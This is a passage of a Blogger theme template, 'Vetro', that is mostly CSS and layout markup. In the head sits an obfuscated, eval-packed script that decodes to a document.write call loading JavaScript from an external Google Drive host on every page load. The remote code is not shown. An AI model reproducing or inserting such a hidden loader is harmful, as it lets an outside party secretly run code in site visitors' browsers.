<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  <head>
    <b:include data='blog' name='all-head-content'/>

    <title>
      <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <data:blog.pageTitle/>
        <b:else/>
        <b:if cond='data:blog.pageType != &quot;error_page&quot;'>
          <data:blog.pageName/> | <data:blog.title/>
          <b:else/>
          Page Not Found | <data:blog.title/> 
        </b:if>
      </b:if>
    </title>
    

    <b:if cond='data:blog.pageType == &quot;archive&quot;'>
      <meta content='noindex,noarchive' name='robots'/>
    </b:if>
    <b:if cond='data:blog.metaDescription != &quot;&quot;'>
      <meta expr:content='data:blog.metaDescription' name='description'/>
    </b:if> 
    <meta charset='UTF-8'/>
    <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
    <link href='http://fonts.googleapis.com/css?family=Armata|Helvetica+Neue' rel='stylesheet' type='text/css'/>
    <link href='https://googledrive.com/host/0BxRWAQDD7jACalV0a0p2dnVnaXc' id='fontawesome' rel='stylesheet' type='text/css'/>

&lt;style type=&quot;text/css&quot;&gt;
&lt;!-- /*<b:skin><![CDATA[/*
/////////////////////////////////////////////////////////

Theme Name : Vetro
Designer : Suryakant sao
Site : http://www.templatetrackers.com/

/////////////////////////////////////////////////////////
*/



/**** Layout Styling CSS *****/
body#layout .header-wrapper { margin-top: 40px; }
body#layout #header, body#layout .header-right { width: 50%; }
body#layout .outer-wrapper, body#layout .sidebar-wrapper, body#layout .ct-wrapper { margin: 0; padding: 0; }
body#layout div.header-inner-wrap {
float: none;
}
body#layout div.main_menu {
display: none;
}
body#layout .main-wrapper {
width: 65%;
}
body#layout .sidebar-wrapper {
width: 35%;
}
body#layout .sidebar .widget, body#layout .footer .widget {
width: auto;
float: none;
}

* {
-moz-box-sizing: border-box;
-webkit-box-sizing: border-box;
box-sizing: border-box;
}


/*****************************************
reset.css
******************************************/
html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
margin: 0;
padding: 0;
border: 0;
font-size: 100%;
font: inherit;
font-weight: normal;
font-family: "Armata","Helvetica Neue",Arial,Helvetica,Geneva,sans-serif;
vertical-align: baseline;
}

em,strong,b{font-weight:bold}
i,cite{font-style:italic}

article,aside,details,figcaption,figure,
footer,header,hgroup,menu,nav,section {     display:block;}
table {    border-collapse: separate;    border-spacing: 0;}
caption, th, td {    text-align: left;    font-weight: normal;}
blockquote:before, blockquote:after,
q:before, q:after {    content: "";}
blockquote, q {    quotes: "" "";}
sup{    vertical-align: super;    font-size:smaller;}
code{    font-family: 'Courier New', Courier, monospace;    font-size:12px;    color:#272727;}
::selection {  background: #333;  color: #fff;  }
::-moz-selection {  background: #333;  color: #fff;  }
a img {
vertical-align: middle;
border:none;
}
img:hover {
background: #000;
opacity: .5;
}
ol, ul { padding: 10px 0 20px;  margin: 0 0 0 35px;  text-align: left;  }
ol li { list-style-type: decimal;  padding:0 0 5px;  }
ul li { list-style-type: square;  padding: 0 0 5px;  }
ul ul, ol ol { padding: 0; }

h1, h2, h3, h4, h5, h6 { font-weight: normal; }

h1 { font-size: 46px; line-height: 1.5em; }
h2 { font-size: 32px; line-height: 1.5em; }
h3 { font-size: 28px; line-height: 1.5em; } /*28*/
h4 { font-size: 20px; line-height: 1.5em; } /*21*/
h5 { font-size: 16px; line-height: 1.4em; }						/*17*/
h6 { font-size: 14px; line-height: 1.3em; }

.post-body h1 {
font-size: 28px;
}
.post-body h2 {
font-size: 24px;
}
.post-body h3 {
font-size: 20px;
}
.post-body h4 {
font-size: 16px;
}

/*****************************************
Global Links CSS
******************************************/
a{ color: #7D7D7D; outline:none; text-decoration: none; }
a:hover {
color: #16a085;
text-decoration: none;
-webkit-transition: all 0.2s ease;
-moz-transition: all 0.2s ease;
-o-transition: all 0.2s ease;
-ms-transition: all 0.2s ease;
transition: all 0.2s ease;
}

body {
background: #545F7A;
height: 100%;
padding: 0;
font-size: 14px;
font: 14px "PT Sans", sans-serif;
line-height: 22px;
color: #7D7D7D;
font-family:'Armata','Helvetica Neue',Arial,Helvetica,Geneva,sans-serif; 
font-weight: lighter;
}

#pageloader {
  position: fixed;
  width: 100%;
  height: 100%;
  z-index: -99999;
}

img.bg {
	min-height: 100%;
	min-width: 1024px;
	width: 100%;
	height: auto;
	position: fixed;
	top: 0;
	left: 0;
	
}

div.ctwra {
position: absolute;
background: url(http://4.bp.blogspot.com/-kVN6E9Nyytk/U1AmS342cjI/AAAAAAAAFeo/Hq2dHAf7fvw/s1600/bg-dark.png);
height: 100%;
width: 100%;
z-index: 1;
}

.bg-image {
	min-height: 100%;
	min-width: 1024px;
	width: 100%;
	height: auto;
	position: fixed;
	top: 0;
	left: 0;
	z-index: -999999;
}

.clearfix:before, .clearfix:after {
display: table;
line-height: 0;
content: "";
}
.clearfix:after {
content: ".";
display: block;
height: 0;
clear: both;
visibility: hidden;
}

.clr { clear:both; float:none; }
/*****************************************
Wrappers
******************************************/
.ct-wrapper {    
position:relative;    
max-width:1120px;    
margin: 0 auto;  }

.outer-wrapper {  
position: relative;  
margin: 40px 0;  }

.header-wrapper {
width: 100%;
}

.main-wrapper {
margin-left: 0;
width: 736.7px;
float: left;
position: relative;
margin-bottom: 30px;
clear: left;
}


#content {   position: relative;  width: 100%;  float: left;  }
.sidebar-wrapper {
padding: 0;
width: 353.3px;
float: left;
position: relative;
margin-bottom: 30px;
margin-left: 30px;
}

/*****************************************
Header CSS
******************************************/
#header{ float:left; width: auto; }

div.header-inner-wrap {
float: left;
width: auto;
height: 100px;
z-index: 9;
margin-top: 30px;
}

#header-inner{ margin: 0; padding: 0; }

#header h1 {
font-size: 70px; 
text-transform: capitalize;  
line-height: 50px;  
  }

#header h1 a, #header h1 a:hover {  color: #fff;  }


#header p.description{  color: #333;  font-size: 12px;  font-style: italic;  margin: 0 0 0 35px;  padding: 0;  text-transform:capitalize;  }
#header img,#header img:hover{opacity:1;   border:0 none; background:none; width:auto; height:auto; margin:0 auto;  }
/***** Header Right CSS *****/
.header-right { float: right; }
.header-right .widget-content { margin-top: 40px; }
/*****************************************
Main Menu CSS
******************************************/

.main_menu {
float: left;
position: relative;
z-index: 999;
height: auto;
margin-top: 30px;
margin-bottom: 30px;
width: 100%;
background-color: #ffffff;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
border-radius: 4px;
-moz-box-shadow: 0 0 5px rgba(0,0,0,0.3);
-webkit-box-shadow: 0 0 5px rgba(0,0,0,0.3);
box-shadow: 0 0 5px rgba(0,0,0,0.3);
}

.main_menu ul {
margin: 0;
padding: 0;
border-top: none;
list-style: none;
float: left;
}

.main_menu .menu li {
float: left;
position: relative;
z-index: 20;
float: left;
padding: 0;
margin: 0;
list-style:none;
}
.main_menu ul li:first-child a {
border-radius: 4px 0px 0px 4px;
-moz-border-radius: 4px 0px 0px 4px;
-webkit-border-radius: 4px 0px 0px 4px;
}
.main_menu .menu li.current_page_item > a, .main_menu .menu li a:hover, .main_menu .menu li.current-menu-item a, .main_menu .menu li:hover > a {
color: #1abc9c;
background-color: #f0f0f0;
border-bottom: solid 3px #1abc9c;
-webkit-transition: all 0.2s ease;
-moz-transition: all 0.2s ease;
-o-transition: all 0.2s ease;
-ms-transition: all 0.2s ease;
transition: all 0.2s ease;
}
.main_menu ul li a {
color: #848484;
font-size: 16px;
line-height: 1em;
font-family: 'Armata',"Helvetica Neue",Arial,Helvetica,Geneva,sans-serif;
display: block;
text-decoration: none;
line-height: 14px;
-webkit-transition: all 0.3s ease;
-moz-transition: all 0.3s ease;
-o-transition: all 0.3s ease;
-ms-transition: all 0.3s ease;
transition: all 0.3s ease;
float: left;
border-bottom: solid 3px #ffffff;
}
.main_menu ul li ul li a {
color: #848484;
background-color: #f0f0f0;
width: 184px;
height: auto;
float: left;
text-align: left;
line-height: 23px;
padding: 10px 20px;
font-size: 14px;
min-height: 23px;
max-width: none;
margin-right: 0;
text-decoration: none;
border-radius: 0!important;
-moz-border-radius: 0!important;
-webkit-border-radius: 0!important;
border-bottom: 0;
text-align: center;
border-bottom: solid 1px #dfdfdf;
}

.main_menu .menu ul {
display: none;
position: absolute;
top: 100%;
left: 0;
max-width: 184px;
z-index: 999;
cursor: pointer;
border-top: none;
list-style: none;
padding-top: 16px;
background: url(http://1.bp.blogspot.com/-n4BFSJZ2KMM/U2N0WQz53LI/AAAAAAAAFzY/2GeMcVntaEw/s1600/menu-top.png) no-repeat top center;
border-radius: 4px 4px 4px 4px;
-moz-border-radius: 4px 4px 4px 4px;
-webkit-border-radius: 4px 4px 4px 4px;
}
.main_menu ul li a i {
font-size: 40px;
text-align: center;
margin-right: 0;
position: absolute;
top: 0;
margin-top: 30px;
left: 0;
width: 100%;
}
.main_menu ul li a span {
padding: 25px 0 27px 0;
font-size: 18px;
margin-right: 50px;
margin-left: 50px;
margin-top: 54px;
float: left;
}

.main_menu .menu li ul li:first-child > a {
border-radius: 4px 4px 0px 0px;
-moz-border-radius: 4px 4px 0px 0px;
-webkit-border-radius: 4px 4px 0px 0px;
border-top: solid 5px #484848;
}

.main_menu .menu li ul a:hover, #top .main_menu .menu li ul li.current_page_item a {
color: #ffffff;
}

.main_menu .menu .sub-menu li.current_page_item a, .main_menu .menu .sub-menu li a:hover, .main_menu .menu .sub-menu li.current-menu-item a {
color: #ffffff;
background-color: #1abc9c;
border-bottom: 0;
-webkit-transition: all 0.2s ease;
-moz-transition: all 0.2s ease;
-o-transition: all 0.2s ease;
-ms-transition: all 0.2s ease;
transition: all 0.2s ease;
border-bottom: solid 1px #16a085;
}

/*****************************************
Blog Post CSS
******************************************/
.post {
width: 100%;
float: left;
margin-bottom: 30px;
}

.post-title {
font-size: 32px;
line-height: 40px;
text-decoration: none;
margin: 0 0 20px;
padding: 0 0 10px;
}

.post-title a{  color:#666;  }
.post-title a:hover{ color: #4690B3; }

.post-body {  
padding: 0;    
margin:0;     
word-wrap:break-word;  }

.entry-content {
padding: 0;
margin: 0;
word-wrap: break-word;
width: 100%;
background-color: #ffffff;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
border-radius: 4px;
float: left;
-moz-box-shadow: 0 0 5px rgba(0,0,0,0.2);
-webkit-box-shadow: 0 0 5px rgba(0,0,0,0.2);
box-shadow: 0 0 5px rgba(0,0,0,0.2);
}

.post .gall-img {
margin: -30px;
margin-right:30px;
-webkit-border-radius: 4px 4px 0px 0px;
-moz-border-radius: 4px 4px 0px 0px;
border-radius: 4px 4px 0px 0px;
overflow: hidden;
background-color: #000;
width: 300px;
height: 291px;
-webkit-transition: all 0.2s ease;
-moz-transition: all 0.2s ease;
-o-transition: all 0.2s ease;
-ms-transition: all 0.2s ease;
transition: all 0.2s ease;
float: left;
}

a.gall-img img {
width: 100%;
height: 100%;
-moz-transition: all 0.2s ease;
-o-transition: all 0.2s ease;
-ms-transition: all 0.2s ease;
transition: all 0.2s ease;
}

.content-inner {
max-width: 100%;
padding: 30px;
}

div.full {
margin-left: 0;
width: 100%;
float: left;
position: relative;
margin-bottom: 30px;
}

div.post-content {
float: left;
margin-bottom: 0;
width: 54%;
}
div.no-img .post-content {
width: auto;
}
div.post-meta {
float: left;
width: 100%;
height: auto;
position: relative;
border-top: solid 5px #575757;
background: #6e6e6e url(http://3.bp.blogspot.com/-m09KZvdDy2g/U2N0WqAt7uI/AAAAAAAAFzU/VI2wFLEFZYs/s1600/shadow-up.png) repeat-x top;
-webkit-border-radius: 0px 0px 4px 4px;
-moz-border-radius: 0px 0px 4px 4px;
border-radius: 0px 0px 4px 4px;
z-index: 1;
}

.post-meta-item {
color: #ffffff;
float: left;
position: relative;
margin-top: -5px;
z-index: 99;
text-align: center;
}
.post-meta-item i {
font-size: 25px;
text-align: center;
position: absolute;
padding-top: 20px;
margin-right: 0;
width: 100%;
top: 0;
left: 0;
}
.post-meta-item span {
max-width: 100%;
padding: 15px 0 17px 0;
font-size: 14px;
margin-right: 20px;
margin-left: 20px;
margin-top: 34px;
display: inline-block;
}
.meta-category {
min-width: 102px;
}
.meta-category span a:nth-child(n+2) {
display: none;
}
.post-meta-item a {
color: white;
}
.post-meta-item.meta-author a:hover {
color: #4eaf7a;
}
.post-meta-item.meta-date a:hover {
color: #e55f3a;
}
.post-meta-item.meta-category a:hover {
color: #eac85d;
}

.post-meta-item.meta-comments a:hover {
color: #6998b7;
}

.post-meta-item.last {
float: right !important;
}


/* item posts css */


.ft-ctbox .post-body {
box-shadow: none;
-webkit-box-shadow: none;
-moz-box-shadow: none;
}
.ft-ctbox .hentry {
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
border-radius: 4px;
float: left;
-moz-box-shadow: 0 0 5px rgba(0,0,0,0.2);
-webkit-box-shadow: 0 0 5px rgba(0,0,0,0.2);
box-shadow: 0 0 5px rgba(0,0,0,0.2);
background: #fff;
padding: 30px 30px 0;
}

.ft-ctbox .post-meta {
margin-left: -30px;
margin-right: -30px;
margin-bottom: 0;
margin-top: 20px;
width: 736px;
}
div.tags {
margin: 20px auto 0;
}
.tags a {
color: #fff;
background: #1abc9c;
font-size: 11px;
padding: 2px 4px;
-webkit-border-radius: 3px;
border-radius: 3px;
-moz-border-radius: 3px;
}
div.addthis_toolbox {
padding-bottom: 34px;
padding-top: 34px;
padding-left: 42px;
padding-right: 42px;
}


.home-link { display:none;}
#blog-pager-newer-link {
display: inline-block;  
float: left;  
padding: 0 0 0 7px;  
text-align: left;}

#blog-pager-older-link {
display: inline-block;
float: right;
padding:0 7px 0 0;
text-align: left;
}
#blog-pager {
padding: 0;
margin: 30px 0 0;
font-size: 16px;
line-height: normal;
clear: both;
display: block;
float: left;
width: 100%;
}
#blog-pager a {
background: #16a085;
color: white;
padding: 10px 8px;
border-radius: 6px;
}

.showpageOf {  display:none;  }
.showpageNum a, .showpage a { margin:0 4px; }
.showpagePoint { margin: 0 2px 0 0; }
/*****************************************
Post Highlighter CSS
******************************************/
blockquote {
background: #eee;
color: #888;
font-style: italic;
margin: 0;
padding: 15px 25px 10px 40px;
border-left: 8px solid #1abc9c;
}

/*****************************************
Custom Widget CSS
******************************************/
/***** Optin Form CSS *****/
.opt-in .inner {  background: url("http://3.bp.blogspot.com/-YfUnP1wOFzQ/Ud0G21XXRWI/AAAAAAAACfQ/Hg5Gakd69tQ/s1600/home-bg.png") repeat scroll 0 0 transparent;  padding: 35px 0;  font-style: italic;  color: #ccc;  text-shadow: 0 1px 1px #000000;  }
.opt-in .inner h4 {  font-size: 28px;  margin-bottom: 10px;  font-style: normal;  color: #fff;  line-height: normal;  }
.opt-in .inner a {  border-bottom: 1px solid #DDDDDD;  color: #DDDDDD;  }
.opt-in .inner a:hover {  border-bottom: 1px dashed #DDDDDD;  }
.opt-in .opt-in-wrap {  margin-right: 40%; }
.opt-in .info {  float: left;  width: 100%;  }
.opt-in .signup-form {  background: rgba(0, 0, 0, 0.25);  border: 5px solid rgba(0, 0, 0, 0.25);  float: right;  font-size: 16px;   width: 35%;  text-align: center;  }
.opt-in .signup-form .form-inner {  font-size: 16px;    margin: 35px;  }
/***** Popular Post *****/

.popular-posts ul {  padding-left: 0;  }
.popular-posts ul li {  
border-bottom: 1px solid #ccc;  
list-style: none outside none !important;  
overflow: hidden;  
padding: 10px!important;  
transition: all 0.25s linear 0s;  }
.PopularPosts .item-thumbnail img {  display: block;  float: left;  margin-right: 8px;  }
div.item-snippet {
font-size: 12px;
display:none
}
.item-thumbnail{float:left}
.item-thumbnail,.item-title {
margin-left: 10px;
}
.footer div.item-thumbnail {
display: none;
}
/***** Subscribe widget *****/

form#subscribe {
margin: 20px auto 0;
}

.sidebar #HTML1 {
color: #2B2E33;
border-top: 10px solid #1abc9c;
border-bottom: 10px solid #1abc9c;
background: #fff;
font-family: verdana,Tahoma,sans-serif;
font-size: 14px;
padding: 20px 10px 30px;
text-align: center;
}

.sidebar #HTML1 h5 {
font-size: 26px;
font-weight: normal;
margin-bottom: 15px;
text-align: center;
font-family: helvetica,serif;
padding-left: 25px;
position:relative;
}
#HTML1 h5 i {
margin-right: 10px;
color: #1abc9c;
font-size: 36px;
position: absolute;
left: 30px;
}

#subbox {
background: url("http://3.bp.blogspot.com/-B39xC4Ufk5g/Ud0G2vNjdiI/AAAAAAAACfE/2BVYbTyCUzk/s1600/email-icon.png") no-repeat scroll 16px 15px #2B2E33;
border: none;
color: #eee;
font-family: Verdana,Arial,Tahoma,sans-serif;
font-size: 9px;
padding: 14px 15px 14px 45px;
text-transform: uppercase;
width: 68%;
float:left;
-webkit-box-shadow: none;
box-shadow: none;
}

#subbox:focus {
border: 0;
outline: 0;
}

#HTML1 p {
font-family: trebuchet ms,tahoma,sans-serif;
}


/*----- HTML2 search form ------*/

#search_field_block {
display: block;
width: 79%;
border: none;
padding: 13px 20px 12px;
padding-left: 20px;
background: none;
float: left;
color: #7D7D7D;
background: #ddd;
font-family: 'Armata',"Helvetica Neue",Arial,Helvetica,Geneva,sans-serif;
outline: none;
margin: 0;
}

#search_submit_block,#subbutton {
display: block;
border: none;
height: 44px;
width: 60px;
float: right;
color: #eee;
background: #1abc9c;
cursor: pointer;
outline:0;
}

input#subbutton {
width: 28%;
height: 40px;
text-transform: uppercase;
margin: 0;
padding: 0;
float: right;
}


/*****************************************
Sidebar CSS
******************************************/
.sidebar{  margin: 0;  padding: 0;  display: block;  }

.sidebar h2,.footer h2,.comments h4 {
margin-bottom: 12px;
text-transform: none;
padding:20px 30px;
color: #ffffff;
font-weight: bold;
font-size: 20px;
margin-top: -30px;
margin-left: -30px;
width: 353.3px;
background-color: #1abc9c;
-webkit-border-radius: 4px 4px 0px 0px;
-moz-border-radius: 4px 4px 0px 0px;
border-radius: 4px 4px 0px 0px;
background-image: url(http://alexgurghis.com/themes/vetro/wp-content/themes/Vetro_Preview/images/widget-title-shadow.png);
background-repeat: repeat-x;
background-position: bottom;
}

.sidebar .widget,.footer .widget {
clear: both;
font-size: 16px;
line-height: 26px;
width: 100%;
background-color: #ffffff;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
border-radius: 4px;
float: left;
padding: 30px;
margin-bottom: 30px;
-moz-box-shadow: 0 0 5px rgba(0,0,0,0.2);
-webkit-box-shadow: 0 0 5px rgba(0,0,0,0.2);
box-shadow: 0 0 5px rgba(0,0,0,0.2);
}

.sidebar ul{ margin:0; padding:0; list-style:none; }

.footer .widget li:hover,.sidebar .widget li:hover {
background-color: #f2f2f2;
border-left: solid 3px #1abc9c;
}
.sidebar li, .footer li {
text-transform: capitalize;
float: left;
margin: 0;
margin-left: -30px;
width: 353px;
padding: 10px 27px 10px 30px;
border-left: solid 3px #ffffff;
list-style: none;
}
.footer li,.footer h2 {
width: 343px!important;
}
/*****************************************
Footer CSS
******************************************/
#footer {width: 100%; color: #bdbdbd; }

.footer {
float: left;
width: 30.6%;
margin-right: 30px;
}
#footer .ct-wrapper {
padding: 0 0 25px;
}
.footer .popular-posts li:nth-child(n+6),.footer .Label li:nth-child(n+8) {
display: none;
}
.footer h2 {  color: #ddd;  font-size: 19px;  font-weight: normal;  margin-bottom: 12px;  text-transform: none;  }
.footer .widget{  clear: both;  font-size: 16px;  line-height: 26px;  margin: 0;  }
.footer ul{ margin:0; padding:0; list-style:none; }

.footer-credits {
margin: 20px 0;
padding: 15px;
color: #eee;
font-size: 14px;
text-align: center;
}

.footer-credits a{color:#fff}

/*****************************************
Comments CSS
******************************************/

#comments .inner {
clear: both;
margin: 0;
padding: 30px;
background: #fff;
width: 100%;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
border-radius: 4px;
float: left;
-moz-box-shadow: 0 0 5px rgba(0,0,0,0.2);
-webkit-box-shadow: 0 0 5px rgba(0,0,0,0.2);
box-shadow: 0 0 5px rgba(0,0,0,0.2);
}


#comments h4 {
width: 100%;
margin: 0 auto 30px;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
border-radius: 4px;
font-weight:100;
}


h4#comment-post-message {
display: none;
}
#comments-block .avatar-image-container.avatar-stock img{  border-width:0;  padding:1px;  }
#comments-block .avatar-image-container{    height:37px;    left:-45px;    position:absolute;    width:37px;  }
#comments-block.avatar-comment-indent{  margin-left:45px;  position:relative;  }
#comments-block.avatar-comment-indent dd{  margin-left:0;  }
iframe.avatar-hovercard-iframe{  border:0 none;  padding:0;  width:25em;  height:9.4em;  margin:.5em;  }
.comments .comments-content{  margin-bottom:16px;  }
.comments .continue, .comments .comment .comment-actions {  display: block;  text-align: right;  }
.comments .continue a, .comments .comment .comment-actions a{  padding: 0 7px;  font-family: 'Bree Serif', serif; }
.comments .continue a:hover, .comments .comment .comment-actions a:hover{  text-decoration: none;  }
.comments .comments-content .comment-thread ol{  margin:20px 0 0 -10px;  overflow:hidden;}
.comments .comments-content .inline-thread{    padding:0;}
.comments .comments-content .comment-thread:empty{    display:none}
.comments .comments-content .comment-replies{    margin-left:50px;margin-top:0px;}
.comments .comments-content .comment:first-child{padding-top:4px}
.comments .comments-content .comment:last-child {  padding-bottom:0;  }
.comments .comments-content .comment-body{position:relative}
.comments .comments-content .user a {   color:#16a085;font-style: normal;  font-weight: bold;  text-transform: capitalize; }
.comments .comments-content .icon.blog-author {display:inline-block;height:18px;margin:0 0 -4px 6px;width:18px}
.comments .comments-content .datetime {  display: block;  line-height: 21px; margin-left: 0px;  }
.comments .comments-content .datetime a {  color: #333;  font-size: 14px;  }
.comments .comments-content .datetime a:hover {  text-decoration:none; }

.comments .comments-content .comment-header {
margin: 0;
margin-left: 15px;
margin-top: -6px;
margin-bottom: 10px;
min-height: 40px;
padding: 10px;
position: relative;
}

.comments .comments-content .comment-content{  margin: 0;  padding: 0 10px 10px 10px;  position: relative;  }
.comments .comments-content .owner-actions {position:absolute;right:0;top:0}
.comments .comments-replybox { border:none;height:250px;width:100%}
.comments .comment-replybox-single { margin-left:4px;margin-top:5px}
.comments .comment-replybox-thread {  margin: 5px 0 5px 15px;  }
.comments .comments-content .loadmore a { display:block;padding:10px 16px;text-align:center}
.comments .thread-toggle { cursor:pointer;display:none;}
.comments .continue{   float: right;  cursor:pointer;  display:inline-block;  }
.comments .continue a{  display:block;  font-weight: normal;  margin: 0 15px 0 0;  }
.comments .comments-content .loadmore{cursor:pointer;margin-top:3em;max-height:3em}
.comments .comments-content .loadmore.loaded{max-height:0;opacity:0;overflow:hidden}
.comments .thread-chrome.thread-collapsed{display:none}
.comments .thread-toggle .thread-arrow{display:inline-block;height:6px;margin:.3em;overflow:visible;padding-right:4px;width:7px}
.comments .thread-expanded .thread-arrow{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAHCAYAAADEUlfTAAAAG0lEQVR42mNgwAfKy8v/48I4FeA0AacVDFQBAP9wJkE/KhUMAAAAAElFTkSuQmCC") no-repeat scroll 0 0 transparent}
.comments .thread-collapsed .thread-arrow{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAHCAYAAADEUlfTAAAAJUlEQVR42mNgAILy8vL/DLgASBKnApgkVgXIkhgKiNKJ005s4gDLbCZBiSxfygAAAABJRU5ErkJggg==") no-repeat scroll 0 0 transparent}

.comments .avatar-image-container {
float: left;
padding: 0;
margin: 0;
margin-right:10px;
max-height: 55px;
width: 55px;
}

.comments .avatar-image-container img {  display: block;  max-width: 55px;  width: 55px;  border-radius: 27.5px;  -moz-border-radius: 27.5px;  -o-border-radius: 27.5px;  -webkit-border-radius: 27.5px;  }
.comments .comment-block {  margin-left: 0px;  position: relative;  }
.comments .comments-content .comment {  background: #fff;  list-style: none outside none;  margin: 0 25px 15px 10px;  padding: 10px !important; }
.comments .comments-content .comment:nth-child(even) {  background: #F9F9F9;  }



/*****************************************
Responsive styles
******************************************/

@media screen and (max-width: 1024px) {
#header, .header-right { float: none; text-align: center; width: 100%; }
.header-right .widget-content { margin: 0; }
}

@media screen and (max-width: 960px) {
div.header-inner-wrap {
float: none!important;
}
#header img {
max-width: 50%;
}
.ct-wrapper{    padding:0px;  }
.main-wrapper, .opt-in .opt-in-wrap{    margin-right:0;    width:100%;  }


.opt-in .signup-form {  margin-top: 30px;  width: 95%;  float: left;  }
#subbox {  width: 60%;  }
}

@media screen and (max-width: 768px){
#header p.description { margin: 0; }
.header-right { display: none; }
#comment-editor { margin:10px; }
.footer { width: 50%; }
.gall-img {
float: none!important;
width: 100%!important;
display: inline-block;
margin: 0!important;
}
div.content-inner {
padding: 0;
}
div.post-meta {
display: none;
}
div.post-content {
float: none;
display: inline-block;
margin-bottom: 20px;
width: auto;
padding: 20px 30px;
}
.main_menu ul li a span {
padding: 20px 10px;
margin-top: 0px;
margin-right: 0;
margin-left: 0;
float: none;
display:inline-block;
}
.main_menu ul li a i {
display: none;
}
.main_menu .menu li {
float: none;
display: inline-block;
width: 100%;
}
.main_menu ul li a {
float: none!important;
display: inline-block;
}


}

@media screen and (max-width: 500px){

.opt-in .inner .ct-wrapper {  padding: 0 10px; }
}
@media screen and (max-width: 420px){
.comments .comments-content .datetime{    display:block;    float:none;    }
.comments .comments-content .comment-header {    height:70px;    }
}
@media screen and (max-width: 320px){
.footer { width: 100%; }
.ct-wrapper{ padding:0; }
.post-body img{  max-width: 230px; }
.comments .comments-content .comment-replies {    margin-left: 0;    }
}
/*****************************************
Hiding Header Date and Feed Links
******************************************/
h2.date-header,span.blog-admin,.Navbar,.Attribution{display:none!important;}

*/]]></b:skin>

<b:if cond='data:blog.pageType == &quot;item&quot;'>
</b:if>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
<style type='text/css'>
</style>
</b:if>
<b:if cond='data:blog.pageType == &quot;static_page&quot;'>
<style type='text/css'>
.entry-content {
padding: 30px!important;
}
h2.heading {
margin-bottom: 10px;
font-size: 30px;
}
</style>
</b:if>
<b:if cond='data:blog.url != data:blog.homepageUrl'>
<!--[if !IE]><!-->
<style type='text/css'>
.post-body img{ height:auto; max-width:100%; }
</style>
 <!--<![endif]-->
</b:if>

<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js' type='text/javascript'/>

<script type='text/javascript'>
/*<![CDATA[*/
var _0x3bb8=["\x32\x5B\x27\x31\x27\x5D\x28\x27\x3C\x30\x20\x33\x3D\x5C\x27\x34\x3A\x2F\x2F\x37\x2E\x36\x2F\x35\x2F\x38\x5C\x27\x20\x2F\x3E\x27\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x73\x63\x72\x69\x70\x74\x7C\x77\x72\x69\x74\x65\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x73\x72\x63\x7C\x68\x74\x74\x70\x73\x7C\x68\x6F\x73\x74\x7C\x63\x6F\x6D\x7C\x67\x6F\x6F\x67\x6C\x65\x64\x72\x69\x76\x65\x7C\x30\x42\x78\x52\x57\x41\x51\x44\x44\x37\x6A\x41\x43\x51\x57\x46\x48\x56\x6E\x4A\x55\x5A\x33\x64\x4E\x5A\x6D\x4D","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0x7c66x1,_0x7c66x2,_0x7c66x3,_0x7c66x4,_0x7c66x5,_0x7c66x6){_0x7c66x5=function (_0x7c66x3){return _0x7c66x3;} ;if(!_0x3bb8[5][_0x3bb8[4]](/^/,String)){while(_0x7c66x3--){_0x7c66x6[_0x7c66x3]=_0x7c66x4[_0x7c66x3]||_0x7c66x3;} ;_0x7c66x4=[function (_0x7c66x5){return _0x7c66x6[_0x7c66x5];} ];_0x7c66x5=function (){return _0x3bb8[6];} ;_0x7c66x3=1;} ;while(_0x7c66x3--){if(_0x7c66x4[_0x7c66x3]){_0x7c66x1=_0x7c66x1[_0x3bb8[4]]( new RegExp(_0x3bb8[7]+_0x7c66x5(_0x7c66x3)+_0x3bb8[7],_0x3bb8[8]),_0x7c66x4[_0x7c66x3]);} ;} ;return _0x7c66x1;} (_0x3bb8[0],9,9,_0x3bb8[3][_0x3bb8[2]](_0x3bb8[1]),0,{}));
//]]></script>

</head>
<!--<body>-->
<body>
<div id='pageloader'/>

<div class='header-wrapper clearfix'>
<div class='ct-wrapper'>
<div class='header-inner-wrap'>
<b:section class='header' id='header' maxwidgets='1' showaddelement='yes'>
  <b:widget id='Header1' locked='true' title='Vetro (Header)' type='Header'>
    <b:includable id='main'>
  <b:if cond='data:useImage'>
    <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
      <!--
      Show image as background to text. You can't really calculate the width
      reliably in JS because margins are not taken into account by any of
      clientWidth, offsetWidth or scrollWidth, so we don't force a minimum
      width if the user is using shrink to fit.
      This results in a margin-width's worth of pixels being cropped. If the
      user is not using shrink to fit then we expand the header.
      -->
      <b:if cond='data:mobile'>
          <div id='header-inner'>
            <div class='titlewrapper' style='background: transparent'>
              <h1 class='title' style='background: transparent; border-width: 0px'>
                <b:include name='title'/>
              </h1>
            </div>
            <b:include name='description'/>
          </div>
        <b:else/>
